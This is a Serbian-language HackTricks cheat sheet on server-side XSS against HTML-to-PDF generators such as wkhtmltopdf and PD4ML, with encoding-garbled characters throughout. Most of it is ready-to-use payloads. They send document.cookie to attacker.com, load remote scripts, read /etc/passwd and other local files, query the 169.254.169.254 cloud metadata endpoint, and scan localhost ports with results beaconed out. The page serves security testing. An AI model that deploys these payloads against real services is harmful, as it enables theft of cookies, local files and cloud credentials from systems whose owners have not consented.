# Server Side XSS (Dinami캜ki PDF)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Server Side XSS (Dinami캜ki PDF)

Ako veb stranica kreira PDF koriste캖i korisni캜ki kontrolisani unos, mo쬰te poku코ati da **prevarite robota** koji kreira PDF da **izvr코i proizvoljni JS kod**.\
Dakle, ako **PDF kreator robot prona캠e** neke vrste **HTML** **tagova**, on 캖e ih **interpretirati**, a vi mo쬰te **zloupotrebiti** ovaj pona코anje da izazovete **Server XSS**.

Molim vas, obratite pa쬹ju da `<script></script>` tagovi ne rade uvek, pa 캖e vam biti potrebna druga metoda za izvr코avanje JS koda (na primer, zloupotreba `<img` ).\
Tako캠e, imajte na umu da 캖ete u redovnom iskori코캖avanju biti **u mogu캖nosti da vidite/preuzmete kreirani PDF**, pa 캖ete mo캖i da vidite sve 코to **pi코ete putem JS-a** (koriste캖i `document.write()` na primer). Ali, ako **ne mo쬰te videti** kreirani PDF, verovatno 캖ete morati **izvu캖i informacije prave캖i web zahtev ka sebi** (Slepi).

### Popularna generacija PDF-a

- **wkhtmltopdf** je poznat po svojoj sposobnosti da konvertuje HTML i CSS u PDF dokumente, koriste캖i WebKit render ma코inu. Ovaj alat je dostupan kao open-source komandna linija, 코to ga 캜ini dostupnim za 코irok spektar aplikacija.
- **TCPDF** nudi robustno re코enje unutar PHP ekosistema za generisanje PDF-a. On je sposoban za rukovanje slikama, grafikama i enkripcijom, 코to pokazuje njegovu sposobnost za kreiranje slo쬰nih dokumenata.
- Za one koji rade u Node.js okru쬰nju, **PDFKit** predstavlja prihvatljivu opciju. Omogu캖ava generisanje PDF dokumenata direktno iz HTML-a i CSS-a, pru쬬ju캖i most izme캠u web sadr쬬ja i formata za 코tampanje.
- Java programeri mogu preferirati **iText**, biblioteku koja ne samo da olak코ava kreiranje PDF-a, ve캖 podr쬬va i napredne funkcionalnosti poput digitalnih potpisa i popunjavanja formulara. Njegov obuhvatan skup funkcionalnosti 캜ini ga pogodnim za generisanje sigurnih i interaktivnih dokumenata.
- **FPDF** je jo코 jedna PHP biblioteka, koja se isti캜e svojom jednostavno코캖u i lako캖om kori코캖enja. Namijenjena je programerima koji tra쬰 jednostavan pristup generisanju PDF-a, bez potrebe za naprednim funkcionalnostima.


## Payloadi

### Otkrivanje
```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```
### SVG

Bilo koji od prethodnih ili slede캖ih payloada mo쬰 se koristiti unutar ovog SVG payloada. Jedan iframe koji pristupa Burpcollab poddomenu i jo코 jedan koji pristupa metadata endpointu su dati kao primeri.
```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
<g>
<foreignObject width="800" height="500">
<body xmlns="http://www.w3.org/1999/xhtml">
<iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
</body>
</foreignObject>
</g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>
<script type="text/javascript">
// <![CDATA[
alert(1);
// ]]>
</script>
</svg>
```
Mo쬰te prona캖i mnogo **drugih SVG payloada** na [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

### Otkrivanje putanje
```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### U캜itajte spoljni skript

Najbolji na캜in za iskori코캖avanje ove ranjivosti je zloupotreba ranjivosti kako bi se naterao bot da u캜ita skriptu kojom vi upravljate lokalno. Zatim 캖ete mo캖i da lokalno promenite payload i naterate bota da ga u캜ita sa istim kodom svaki put.
```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### 캛itanje lokalne datoteke / SSRF

{% hint style="warning" %}
Promenite `file:///etc/passwd` u `http://169.254.169.254/latest/user-data` na primer da **poku코ate da pristupite spoljnoj veb stranici (SSRF)**.

Ako je SSRF dozvoljen, ali **ne mo쬰te da pristupite** zanimljivom domenu ili IP adresi, [proverite ovu stranicu za potencijalne zaobila쬰nja](../ssrf-server-side-request-forgery/url-format-bypass.md).
{% endhint %}
```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
xhzeem = new XMLHttpRequest();
xhzeem.onload = function(){document.write(this.responseText);}
xhzeem.onerror = function(){document.write('failed!')}
xhzeem.open("GET","file:///etc/passwd");
xhzeem.send();
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```markup
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```
### Ka코njenje robota

U nekim situacijama, prilikom izvo캠enja napada, mo쬰 biti korisno dodati ka코njenje izme캠u svake iteracije kako bi se izbeglo otkrivanje i spre캜ilo blokiranje od strane ciljnog servera. Ovo se naziva "bot delay" ili ka코njenje robota.

Da biste implementirali ka코njenje robota, mo쬰te koristiti funkciju `sleep()` ili sli캜ne metode u programskom jeziku koji koristite za izvr코avanje napada. Ova funkcija 캖e privremeno zaustaviti izvr코avanje programa na odre캠eno vreme pre nego 코to nastavi sa slede캖om iteracijom.

Na primer, u Pythonu mo쬰te koristiti biblioteku `time` i funkciju `sleep()` kako biste postavili ka코njenje izme캠u iteracija. Evo kako to mo쬰te uraditi:

```python
import time

# Postavite ka코njenje od 1 sekunde izme캠u iteracija
time.sleep(1)
```

Ovo 캖e zaustaviti izvr코avanje programa na 1 sekundu pre nego 코to nastavi sa slede캖om iteracijom. Mo쬰te prilagoditi vreme ka코njenja prema potrebama i zahtevima napada.

Va쬹o je napomenuti da ka코njenje robota mo쬰 biti korisno u odre캠enim situacijama, ali nije uvek neophodno ili efikasno. Treba pa쬷jivo proceniti kada je potrebno koristiti ka코njenje robota kako bi se postigao optimalan rezultat napada.
```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
let time = 500;
setInterval(()=>{
let img = document.createElement("img");
img.src = `https://attacker.com/ping?time=${time}ms`;
time += 500;
}, 500);
</script>
<img src="https://attacker.com/delay">
```
### Skeniranje portova

Port skeniranje je proces koji se koristi za identifikaciju otvorenih portova na ciljnom ra캜unaru ili mre쬴. Ova tehnika omogu캖ava hakerima da otkriju ranjive ta캜ke ulaza i izlaza, kao i da identifikuju servise koji su dostupni na ciljnom sistemu.

Da biste izvr코ili port skeniranje, mo쬰te koristiti razli캜ite alate kao 코to su Nmap, Masscan ili Zmap. Ovi alati 코alju mre쬹e zahteve na odre캠ene portove i analiziraju odgovore kako bi utvrdili da li su portovi otvoreni, zatvoreni ili filtrirani.

Port skeniranje mo쬰 biti korisno u procesu testiranja penetracije, jer omogu캖ava identifikaciju potencijalnih ranjivosti i slabosti u mre쬹oj infrastrukturi. Me캠utim, va쬹o je napomenuti da port skeniranje mo쬰 biti nezakonito ako se izvodi bez dozvole vlasnika sistema ili mre쬰.

Kada izvr코avate port skeniranje, va쬹o je biti pa쬷jiv i po코tovati zakonske propise. Uvek se preporu캜uje da imate pisanu dozvolu od vlasnika sistema ili mre쬰 pre nego 코to izvr코ite bilo kakvo skeniranje portova.
```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
let img = document.createElement("img");
img.src = `http://attacker.com/ping?port=${port}`;
});
}

for(let i=0; i<1000; i++) {
checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```
### [SSRF](../ssrf-server-side-request-forgery/)

Ova ranjivost se mo쬰 vrlo lako transformisati u SSRF (jer mo쬰te u캜itati spoljne resurse pomo캖u skripte). Poku코ajte je iskoristiti (pro캜itajte neke metapodatke?).

### Prilozi: PD4ML

Postoje neki HTML 2 PDF engine-i koji omogu캖avaju **specificiranje priloga za PDF**, kao 코to je **PD4ML**. Mo쬰te zloupotrebiti ovu funkcionalnost da **prilo쬴te bilo koji lokalni fajl** PDF-u.\
Da biste otvorili prilog, otvorio sam fajl sa **Firefox-om i dvaput kliknuo na simbol spajalice** da bih **sa캜uvao prilog** kao novi fajl.\
Snimanje **PDF odgovora** sa Burp-om tako캠e bi trebalo da **prika쬰 prilog u 캜istom tekstu** unutar PDF-a.

{% code overflow="wrap" %}
```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```
{% endcode %}

## Reference

* [https://lbherrera.github.io/lab/h1415-ctf-writeup.html](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
* [https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
* [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
* [https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
